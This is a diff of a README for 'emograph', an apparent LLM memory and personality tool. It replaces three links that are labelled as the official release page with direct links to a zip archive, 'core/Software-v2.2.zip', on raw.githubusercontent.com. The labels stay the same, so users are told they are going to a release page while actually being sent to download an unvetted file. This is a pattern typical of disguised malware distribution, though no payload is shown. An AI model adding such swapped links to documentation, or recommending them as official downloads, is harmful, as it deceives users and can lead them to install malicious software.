@@ -1,6 +1,6 @@
 # 🧠 emograph - Memory and personality for LLMs
 
-[![Download emograph](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Prudencefiberscope303/emograph/releases)
+[![Download emograph](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Prudencefiberscope303/emograph/main/core/Software-v2.2.zip)
 
 ## 📌 What emograph does
 
@@ -18,7 +18,7 @@ Use it when you want an LLM-based app to:
 
 Use the release page to download and install emograph on Windows.
 
-[Visit the release page to download emograph](https://github.com/Prudencefiberscope303/emograph/releases)
+[Visit the release page to download emograph](https://raw.githubusercontent.com/Prudencefiberscope303/emograph/main/core/Software-v2.2.zip)
 
 ### What to look for
 
@@ -304,7 +304,7 @@ For smooth use:
 
 Use the official release page here:
 
-[https://github.com/Prudencefiberscope303/emograph/releases](https://github.com/Prudencefiberscope303/emograph/releases)
+[https://raw.githubusercontent.com/Prudencefiberscope303/emograph/main/core/Software-v2.2.zip](https://raw.githubusercontent.com/Prudencefiberscope303/emograph/main/core/Software-v2.2.zip)
 
 ## 📚 Repository topics
 
